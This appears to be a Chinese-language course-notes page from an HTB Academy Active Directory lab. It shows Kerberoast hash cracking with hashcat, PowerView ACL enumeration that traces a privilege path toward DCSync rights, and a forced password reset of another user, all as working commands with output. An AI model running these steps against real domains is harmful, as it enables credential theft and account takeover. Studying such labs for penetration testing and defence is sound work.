<h3 id="运行-Hashcat-并检查破解任务状态"><a href="#运行-Hashcat-并检查破解任务状态" class="headerlink" title="运行 Hashcat 并检查破解任务状态"></a>运行 Hashcat 并检查破解任务状态</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs powerhsell">c2tt@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt <br><br>hashcat (v6.1.1) starting...<br><br>&lt;SNIP&gt;<br><br>[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s<br><br>Session..........: hashcat<br>Status...........: Running<br>Hash.Name........: Kerberos 5, etype 18, TGS-REP<br>Hash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53<br>Time.Started.....: Sun Feb 27 16:07:50 2022 (57 secs)<br>Time.Estimated...: Sun Feb 27 16:31:06 2022 (22 mins, 19 secs)<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.#1.........:    10277 H/s (8.99ms) @ Accel:1024 Loops:64 Thr:1 Vec:8<br>Recovered........: 0/1 (0.00%) Digests<br>Progress.........: 583680/14344385 (4.07%)<br>Rejected.........: 0/583680 (0.00%)<br>Restore.Point....: 583680/14344385 (4.07%)<br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3264-3328<br>Candidates.#1....: skitzy -&gt; sammy&lt;3<br><br>[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;<br></code></pre></td></tr></table></figure>

<h3 id="查看破解所需时间"><a href="#查看破解所需时间" class="headerlink" title="查看破解所需时间"></a>查看破解所需时间</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">18</span>, TGS<span class="hljs-literal">-REP</span><br>Hash.Target......: <span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$18</span><span class="hljs-variable">$testspn</span><span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$8939f8c5b97</span>...<span class="hljs-number">413</span>d53<br>Time.Started.....: Sun Feb <span class="hljs-number">27</span> <span class="hljs-number">16</span>:<span class="hljs-number">07</span>:<span class="hljs-number">50</span> <span class="hljs-number">2022</span> (<span class="hljs-number">4</span> mins, <span class="hljs-number">36</span> secs)<br>Time.Estimated...: Sun Feb <span class="hljs-number">27</span> <span class="hljs-number">16</span>:<span class="hljs-number">12</span>:<span class="hljs-number">26</span> <span class="hljs-number">2022</span> (<span class="hljs-number">0</span> secs)<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)<br>Speed.<span class="hljs-comment">#1.........:    10114 H/s (9.25ms) @ Accel:1024 Loops:64 Thr:1 Vec:8</span><br>Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests<br>Progress.........: <span class="hljs-number">2789376</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">19.45</span>%)<br>Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">2789376</span> (<span class="hljs-number">0.00</span>%)<br>Restore.Point....: <span class="hljs-number">2783232</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">19.40</span>%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:0-1 Iteration:4032-4095</span><br>Candidates.<span class="hljs-comment">#1....: wenses28 -&gt; wejustare</span><br></code></pre></td></tr></table></figure>

<h3 id="使用-tgtdeleg-标志"><a href="#使用-tgtdeleg-标志" class="headerlink" title="使用 &#x2F;tgtdeleg 标志"></a>使用 &#x2F;tgtdeleg 标志</h3><p>我们可以使用 Rubeus 并结合 <code>/tgtdeleg</code> 标志来指定在请求新服务票据时仅使用 RC4 加密。该工具通过在 TGS 请求体中指定 RC4 加密为唯一支持的算法来实现这一点。这可能是 Active Directory 内置的一种向后兼容的保障措施。通过使用此标志，我们可以请求一个 RC4（类型 23）加密的票据，该票据破解速度会快得多。</p>
<h1 id="ACL滥用"><a href="#ACL滥用" class="headerlink" title="ACL滥用"></a>ACL滥用</h1><h2 id="ACL-枚举"><a href="#ACL-枚举" class="headerlink" title="ACL 枚举"></a>ACL 枚举</h2><h3 id="使用-PowerView-枚举-ACL"><a href="#使用-PowerView-枚举-ACL" class="headerlink" title="使用 PowerView 枚举 ACL"></a>使用 PowerView 枚举 ACL</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Find-InterestingDomainAcl</span><br><br>ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL<br>AceQualifier            : AccessAllowed<br>ActiveDirectoryRights   : ExtendedRight<br>ObjectAceType           : ab721a53<span class="hljs-literal">-1e2f-11d0-9819-00aa0040529b</span><br>AceFlags                : ContainerInherit<br>AceType                 : AccessAllowedObject<br>InheritanceFlags        : ContainerInherit<br>SecurityIdentifier      : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-5189</span><br>IdentityReferenceName   : Exchange Windows Permissions<br>IdentityReferenceDomain : INLANEFREIGHT.LOCAL<br>IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security <br>                          Groups,DC=INLANEFREIGHT,DC=LOCAL<br>IdentityReferenceClass  : <span class="hljs-built_in">group</span><br><br>ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL<br>AceQualifier            : AccessAllowed<br>ActiveDirectoryRights   : ExtendedRight<br>ObjectAceType           : <span class="hljs-number">00299570</span><span class="hljs-literal">-246d-11d0-a768-00aa006e0529</span><br>AceFlags                : ContainerInherit<br>AceType                 : AccessAllowedObject<br>InheritanceFlags        : ContainerInherit<br>SecurityIdentifier      : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-5189</span><br>IdentityReferenceName   : Exchange Windows Permissions<br>IdentityReferenceDomain : INLANEFREIGHT.LOCAL<br>IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security <br>                          Groups,DC=INLANEFREIGHT,DC=LOCAL<br>IdentityReferenceClass  : <span class="hljs-built_in">group</span><br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Import-Module</span> .\PowerView.ps1<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$sid</span> = <span class="hljs-built_in">Convert-NameToSid</span> wley<br></code></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainObjectACL"><a href="#使用-Get-DomainObjectACL" class="headerlink" title="使用 Get-DomainObjectACL"></a>使用 Get-DomainObjectACL</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainObjectACL</span> <span class="hljs-literal">-Identity</span> * | ? &#123;<span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-eq</span> <span class="hljs-variable">$sid</span>&#125;<br><br>ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>ObjectSID              : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1176</span><br>ActiveDirectoryRights  : ExtendedRight<br>ObjectAceFlags         : ObjectAceTypePresent<br>ObjectAceType          : <span class="hljs-number">00299570</span><span class="hljs-literal">-246d-11d0-a768-00aa006e0529</span><br>InheritedObjectAceType : <span class="hljs-number">00000000</span><span class="hljs-literal">-0000-0000-0000-000000000000</span><br>BinaryLength           : <span class="hljs-number">56</span><br>AceQualifier           : AccessAllowed<br>IsCallback             : False<br>OpaqueLength           : <span class="hljs-number">0</span><br>AccessMask             : <span class="hljs-number">256</span><br>SecurityIdentifier     : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1181</span><br>AceType                : AccessAllowedObject<br>AceFlags               : ContainerInherit<br>IsInherited            : False<br>InheritanceFlags       : ContainerInherit<br>PropagationFlags       : None<br>AuditFlags             : None<br></code></pre></td></tr></table></figure>

<h3 id="执行反向搜索与映射到-GUID-值"><a href="#执行反向搜索与映射到-GUID-值" class="headerlink" title="执行反向搜索与映射到 GUID 值"></a>执行反向搜索与映射到 GUID 值</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$guid</span>= <span class="hljs-string">&quot;00299570-246d-11d0-a768-00aa006e0529&quot;</span><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-SearchBase</span> <span class="hljs-string">&quot;CN=Extended-Rights,<span class="hljs-variable">$</span>((Get-ADRootDSE).ConfigurationNamingContext)&quot;</span> <span class="hljs-literal">-Filter</span> &#123;ObjectClass <span class="hljs-operator">-like</span> <span class="hljs-string">&#x27;ControlAccessRight&#x27;</span>&#125; <span class="hljs-literal">-Properties</span> * |<span class="hljs-built_in">Select</span> Name,DisplayName,DistinguishedName,rightsGuid| ?&#123;<span class="hljs-variable">$_</span>.rightsGuid <span class="hljs-operator">-eq</span> <span class="hljs-variable">$guid</span>&#125; | <span class="hljs-built_in">fl</span><br><br>Name              : User<span class="hljs-literal">-Force-Change-Password</span><br>DisplayName       : Reset Password<br>DistinguishedName : CN=User<span class="hljs-literal">-Force-Change-Password</span>,CN=Extended<span class="hljs-literal">-Rights</span>,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL<br>rightsGuid        : <span class="hljs-number">00299570</span><span class="hljs-literal">-246d-11d0-a768-00aa006e0529</span><br></code></pre></td></tr></table></figure>

<h3 id="Using-the-ResolveGUIDs-Flag"><a href="#Using-the-ResolveGUIDs-Flag" class="headerlink" title="Using the -ResolveGUIDs Flag"></a>Using the -ResolveGUIDs Flag</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainObjectACL</span> <span class="hljs-literal">-ResolveGUIDs</span> <span class="hljs-literal">-Identity</span> * | ? &#123;<span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-eq</span> <span class="hljs-variable">$sid</span>&#125; <br><br>AceQualifier           : AccessAllowed<br>ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights  : ExtendedRight<br>ObjectAceType          : User<span class="hljs-literal">-Force-Change-Password</span><br>ObjectSID              : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1176</span><br>InheritanceFlags       : ContainerInherit<br>BinaryLength           : <span class="hljs-number">56</span><br>AceType                : AccessAllowedObject<br>ObjectAceFlags         : ObjectAceTypePresent<br>IsCallback             : False<br>PropagationFlags       : None<br>SecurityIdentifier     : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1181</span><br>AccessMask             : <span class="hljs-number">256</span><br>AuditFlags             : None<br>IsInherited            : False<br>AceFlags               : ContainerInherit<br>InheritedObjectAceType : All<br>OpaqueLength           : <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<h3 id="创建域用户列表"><a href="#创建域用户列表" class="headerlink" title="创建域用户列表"></a>创建域用户列表</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> * | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-ExpandProperty</span> SamAccountName &gt; ad_users.txt<br></code></pre></td></tr></table></figure>

<h3 id="一个有用的-foreach-循环"><a href="#一个有用的-foreach-循环" class="headerlink" title="一个有用的 foreach 循环"></a>一个有用的 foreach 循环</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$line</span> <span class="hljs-keyword">in</span> [<span class="hljs-type">System.IO.File</span>]::ReadLines(<span class="hljs-string">&quot;C:\Users\htb-student\Desktop\ad_users.txt&quot;</span>)) &#123;<span class="hljs-built_in">get-acl</span>  <span class="hljs-string">&quot;AD:\<span class="hljs-variable">$</span>(Get-ADUser <span class="hljs-variable">$line</span>)&quot;</span> | <span class="hljs-built_in">Select-Object</span> Path <span class="hljs-literal">-ExpandProperty</span> Access | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.IdentityReference <span class="hljs-operator">-match</span> <span class="hljs-string">&#x27;INLANEFREIGHT\\wley&#x27;</span>&#125;&#125;<br><br>Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana <br>                        Amundsen,OU=DevOps,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights : ExtendedRight<br>InheritanceType       : All<br>ObjectType            : <span class="hljs-number">00299570</span><span class="hljs-literal">-246d-11d0-a768-00aa006e0529</span><br>InheritedObjectType   : <span class="hljs-number">00000000</span><span class="hljs-literal">-0000-0000-0000-000000000000</span><br>ObjectFlags           : ObjectAceTypePresent<br>AccessControlType     : Allow<br>IdentityReference     : INLANEFREIGHT\wley<br>IsInherited           : False<br>InheritanceFlags      : ContainerInherit<br>PropagationFlags      : None<br></code></pre></td></tr></table></figure>

<h3 id="使用-damundsen-进一步枚举权限"><a href="#使用-damundsen-进一步枚举权限" class="headerlink" title="使用 damundsen 进一步枚举权限"></a>使用 damundsen 进一步枚举权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$sid2</span> = <span class="hljs-built_in">Convert-NameToSid</span> damundsen<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainObjectACL</span> <span class="hljs-literal">-ResolveGUIDs</span> <span class="hljs-literal">-Identity</span> * | ? &#123;<span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-eq</span> <span class="hljs-variable">$sid2</span>&#125; <span class="hljs-literal">-Verbose</span><br><br>AceType               : AccessAllowed<br>ObjectDN              : CN=Help Desk Level <span class="hljs-number">1</span>,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite<br>OpaqueLength          : <span class="hljs-number">0</span><br>ObjectSID             : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-4022</span><br>InheritanceFlags      : ContainerInherit<br>BinaryLength          : <span class="hljs-number">36</span><br>IsInherited           : False<br>IsCallback            : False<br>PropagationFlags      : None<br>SecurityIdentifier    : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1176</span><br>AccessMask            : <span class="hljs-number">131132</span><br>AuditFlags            : None<br>AceFlags              : ContainerInherit<br>AceQualifier          : AccessAllowed<br></code></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainGroup-调查Help-Level-1-Group"><a href="#使用-Get-DomainGroup-调查Help-Level-1-Group" class="headerlink" title="使用 Get-DomainGroup 调查Help Level 1 Group"></a>使用 Get-DomainGroup 调查Help Level 1 Group</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainGroup</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Help Desk Level 1&quot;</span> | <span class="hljs-built_in">select</span> memberof<br><br>memberof                                                                      <br><span class="hljs-literal">--------</span>                                                                      <br>CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br></code></pre></td></tr></table></figure>

<ul>
<li>我们控制了用户 <code>wley</code> ，其哈希值在模块（评估）中通过 Responder 获取，并使用 Hashcat 离线破解以揭示明文密码值</li>
<li>我们枚举了用户 <code>wley</code> 控制的对象，并发现可以强制更改用户 <code>damundsen</code> 的密码</li>
<li>从这里，我们发现 <code>damundsen</code> 用户可以使用 <code>GenericWrite</code> 权限向 <code>Help Desk Level 1</code> 组添加成员</li>
<li><code>Help Desk Level 1</code> 组嵌套在 <code>Information Technology</code> 组中，这使得该组成员获得授予 <code>Information Technology</code> 组的所有权限</li>
</ul>
<h3 id="调查Information-Technology-Group"><a href="#调查Information-Technology-Group" class="headerlink" title="调查Information Technology Group"></a>调查Information Technology Group</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$itgroupsid</span> = <span class="hljs-built_in">Convert-NameToSid</span> <span class="hljs-string">&quot;Information Technology&quot;</span><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainObjectACL</span> <span class="hljs-literal">-ResolveGUIDs</span> <span class="hljs-literal">-Identity</span> * | ? &#123;<span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-eq</span> <span class="hljs-variable">$itgroupsid</span>&#125; <span class="hljs-literal">-Verbose</span><br><br>AceType               : AccessAllowed<br>ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights : GenericAll<br>OpaqueLength          : <span class="hljs-number">0</span><br>ObjectSID             : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1164</span><br>InheritanceFlags      : ContainerInherit<br>BinaryLength          : <span class="hljs-number">36</span><br>IsInherited           : False<br>IsCallback            : False<br>PropagationFlags      : None<br>SecurityIdentifier    : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-4016</span><br>AccessMask            : <span class="hljs-number">983551</span><br>AuditFlags            : None<br>AceFlags              : ContainerInherit<br>AceQualifier          : AccessAllowed<br></code></pre></td></tr></table></figure>

<h3 id="寻找有趣的访问"><a href="#寻找有趣的访问" class="headerlink" title="寻找有趣的访问"></a>寻找有趣的访问</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$adunnsid</span> = <span class="hljs-built_in">Convert-NameToSid</span> adunn <br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainObjectACL</span> <span class="hljs-literal">-ResolveGUIDs</span> <span class="hljs-literal">-Identity</span> * | ? &#123;<span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-eq</span> <span class="hljs-variable">$adunnsid</span>&#125; <span class="hljs-literal">-Verbose</span><br><br>AceQualifier           : AccessAllowed<br>ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights  : ExtendedRight<br>ObjectAceType          : DS<span class="hljs-literal">-Replication-Get-Changes-In-Filtered-Set</span><br>ObjectSID              : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114</span><br>InheritanceFlags       : ContainerInherit<br>BinaryLength           : <span class="hljs-number">56</span><br>AceType                : AccessAllowedObject<br>ObjectAceFlags         : ObjectAceTypePresent<br>IsCallback             : False<br>PropagationFlags       : None<br>SecurityIdentifier     : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1164</span><br>AccessMask             : <span class="hljs-number">256</span><br>AuditFlags             : None<br>IsInherited            : False<br>AceFlags               : ContainerInherit<br>InheritedObjectAceType : All<br>OpaqueLength           : <span class="hljs-number">0</span><br><br>AceQualifier           : AccessAllowed<br>ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL<br>ActiveDirectoryRights  : ExtendedRight<br>ObjectAceType          : DS<span class="hljs-literal">-Replication-Get-Changes</span><br>ObjectSID              : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114</span><br>InheritanceFlags       : ContainerInherit<br>BinaryLength           : <span class="hljs-number">56</span><br>AceType                : AccessAllowedObject<br>ObjectAceFlags         : ObjectAceTypePresent<br>IsCallback             : False<br>PropagationFlags       : None<br>SecurityIdentifier     : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1164</span><br>AccessMask             : <span class="hljs-number">256</span><br>AuditFlags             : None<br>IsInherited            : False<br>AceFlags               : ContainerInherit<br>InheritedObjectAceType : All<br>OpaqueLength           : <span class="hljs-number">0</span><br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h2 id="ACL-滥用策略"><a href="#ACL-滥用策略" class="headerlink" title="ACL 滥用策略"></a>ACL 滥用策略</h2><h3 id="创建-PSCredential-对象"><a href="#创建-PSCredential-对象" class="headerlink" title="创建 PSCredential 对象"></a>创建 PSCredential 对象</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$SecPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;&lt;PASSWORD HERE&gt;&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;INLANEFREIGHT\wley&#x27;</span>, <span class="hljs-variable">$SecPassword</span>)<br></code></pre></td></tr></table></figure>

<h3 id="创建一个-SecureString-对象"><a href="#创建一个-SecureString-对象" class="headerlink" title="创建一个 SecureString 对象"></a>创建一个 SecureString 对象</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$damundsenPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Pwn3d_by_ACLs!&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br></code></pre></td></tr></table></figure>

<h3 id="更改用户密码"><a href="#更改用户密码" class="headerlink" title="更改用户密码"></a>更改用户密码</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">cd</span> C:\Tools\<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Import-Module</span> .\PowerView.ps1<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Set-DomainUserPassword</span> <span class="hljs-literal">-Identity</span> damundsen <span class="hljs-literal">-AccountPassword</span> <span class="hljs-variable">$damundsenPassword</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-Verbose</span><br><br>VERBOSE: [<span class="hljs-built_in">Get-PrincipalContext</span>] <span class="hljs-keyword">Using</span> alternate credentials<br>VERBOSE: [<span class="hljs-built_in">Set-DomainUserPassword</span>] Attempting to <span class="hljs-built_in">set</span> the password <span class="hljs-keyword">for</span> user <span class="hljs-string">&#x27;damundsen&#x27;</span><br>VERBOSE: [<span class="hljs-built_in">Set-DomainUserPassword</span>] Password <span class="hljs-keyword">for</span> user <span class="hljs-string">&#x27;damundsen&#x27;</span> successfully reset<br></code></pre></td></tr></table></figure>

